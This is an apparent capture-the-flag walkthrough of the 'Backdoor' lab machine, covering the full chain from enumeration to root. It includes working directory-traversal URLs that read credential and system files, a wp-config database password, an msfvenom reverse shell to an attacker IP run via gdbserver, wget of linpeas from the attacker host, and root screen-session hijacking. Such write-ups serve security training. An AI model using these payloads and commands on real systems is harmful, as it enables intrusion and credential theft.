# Backdoor - Easy

```sh
sudo vim /etc/hosts
# add backdoor.htb

nmap -T4 -p- -A -Pn -v backdoor.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
    * 80/tcp - http - Apache httpd 2.4.41
    * 1337/tcp - open

* the service on port 1337 cannot be determined as it does not respond to ```nc``` or ```curl```

* checking the webpage on port 80, it seems to be a blog page and is running on WordPress 5.8.1

* there is not a lot of useful content on the webpage, and the only post shows that 'admin' user exists

* web enumeration:

    ```sh
    gobuster dir -u http://backdoor.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md -t 20
    # dir scan

    ffuf -c -u 'http://backdoor.htb' -H 'Host: FUZZ.backdoor.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 3830 -s
    # subdomain scan
    ```

* we can scan this instance using ```wpscan``` as well:

    ```sh
    wpscan --url http://backdoor.htb --enumerate ap --plugins-detection aggressive
    ```

* the aggressive plugin scan using ```wpscan``` detects a plugin 'ebook-download' at 'http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt', version 1.1

* Googling for exploits associated with this plugin version leads to [this directory traversal exploit](https://www.exploit-db.com/exploits/39575)

* following the PoC given, we can check if this exploit works:

    ```sh
    curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../etc/passwd
    # this works
    ```

* the directory traversal exploit works, and ```/etc/passwd``` discloses an user named 'user'

* we can try to gather more info and enumerate by reading [common files for directory traversal](https://lobehub.com/es/skills/davila7-claude-code-templates-file-path-traversal) (in the same payload format):

    * ```/etc/hosts```
    * ```/etc/resolv.conf```
    * ```/etc/issue``` - shows 'Ubuntu 20.04.2 LTS'
    * ```/etc/ssh/sshd_config```
    * ```/home/user/.ssh/id_rsa```
    * ```/home/user/.ssh/authorized_keys```
    * ```/home/user/.bash_history```
    * ```/var/www/html/wp-config.php``` - discloses the DB creds 'wordpressuser:MQYBJSaD#DxG6qbm'
    * ```/var/www/html/.env```
    * ```/var/www/html/.htaccess```
    * ```/var/www/html/.htpasswd```
    * ```/etc/apache2/apache2.conf```
    * ```/etc/apache2/sites-enabled/000-default.conf```
    * ```/etc/apache2/sites-available/000-default.conf```
    * ```/proc/self/environ```
    * ```/proc/self/cmdline``` - this gives ```/usr/sbin/apache2-kstart```
    * ```/proc/self/cwd```
    * ```/proc/self/fd/0```
    * ```/proc/version``` - Linux version 5.4.0-80-generic
    * ```/proc/net/tcp```
    * ```/proc/net/udp```
    * ```/proc/sched_debug``` - gives a lot of process-related info
    * ```/proc/mounts```

* reusing the WordPress DB creds for 'admin' user in the WordPress admin login page at '/wp-login', or for 'user' over SSH, does not work

* checking the output of ```/proc/sched_debug``` (provides real-time data on system tasks & processes), we get a lot of process-related info, including PIDs and names of processes

* as we have a service running on port 1337, but no info about this service itself, we can try to enumerate the process info next

* similar to how we were able to obtain the command-line info for current process using ```/proc/self/cmdline```, we can use the format ```/proc/<pid>/cmdline``` to get command-line info about any process using its PID

* we first need a list of PIDs from the data dump of ```/proc/sched_debug```:

    ```sh
    curl --output sched_debug_output http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/sched_debug
    # save output to a file

    awk '/^ [SIR]/ {print $3}' sched_debug_output > pids.txt
    # this prints the 3rd column after the letters 'S', 'I', or 'R'
    # it is a quick filter and prints some non-PID numbers, but it is fine as it filters all PIDs at least

    less pids.txt
    ```

* as we have a list of all PIDs on the machine, we can now fuzz with the payload ```/proc/<PID>/cmdline``` to enumerate the processes

* we know that the PIDs which do not have any info associated with it contain the string ```/proc/<PID>/cmdline<script>window.close()</script>``` in the response (for the given PoC format), so we can use this to filter regex in ```ffuf```:

    ```sh
    ffuf -u http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/FUZZ/cmdline -w pids.txt -fr 'cmdline<script>'
    # we can ignore responses with regex 'cmdline<script>'

    # save PIDs to a file
    ffuf -u http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/FUZZ/cmdline -w pids.txt -fr 'cmdline<script>' -s | tee cleanpids.txt
    ```

* now that we have a list of PIDs for which we need to check for process commandline info, we can use it to fetch all info using ```curl```, and we can enumerate the output for any info:

    ```sh
    for i in $(cat cleanpids.txt); do curl -s "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/$i/cmdline" >> pidcmdline.txt; echo >> pidcmdline.txt; done
    # prints the cmdline output, and newline
    # for each PID in loop

    less pidcmdline.txt
    ```

* from the commandline output, we can see that some PIDs are running the following commands:

    ```sh
    do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;";

    cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;

    gdbserver --once 0.0.0.0:1337 /bin/true
    ```

* this shows that the service running on port 1337 is ```gdbserver```

* Googling for ```gdbserver``` enumeration and exploits leads to [this hacktricks blog for remote gdbserver](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html) - we can try this exploit to get reverse shell:

    ```sh
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.95 LPORT=4444 PrependFork=true -f elf -o binary.elf
    # create payload

    nc -nvlp 4444
    # setup listener

    chmod +x binary.elf

    gdb binary.elf

    # set remote debugger target in gdb
    target extended-remote backdoor.htb:1337

    # upload binary
    remote put binary.elf binary.elf

    # set remote executable file
    set remote exec-file /home/user/binary.elf
    # path to remote binary - as we know it is running in '/home/user/' path

    run
    # execute binary payload
    
    # this gives us reverse shell
    ```

* in reverse shell:

    ```sh
    id
    # user 'user'

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    ls -la

    cat user.txt
    # user flag

    # we can use linpeas for basic enum - fetch script from attacker

    wget http://10.10.14.95:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-80-generic, Ubuntu 20.04.3
    * running processes includes a non-default cronjob - ```/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done```
    * MySQL is running
    * user screen sessions includes a screen for '1005.root'; socket in ```/run/screen/S-root```

* we can check the ```screen``` listing first, using [this screen sessions hijacking method from hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions):

    ```sh
    screen -ls
    # no screen sessions for current user

    screen -ls root/
    # lists a screen session for root
    # shown as detached, so we do not need to detach again

    screen -x root/1005.root
    # attach to given session
    # this works and we have root shell

    cat /root/root.txt
    # root flag
    ```
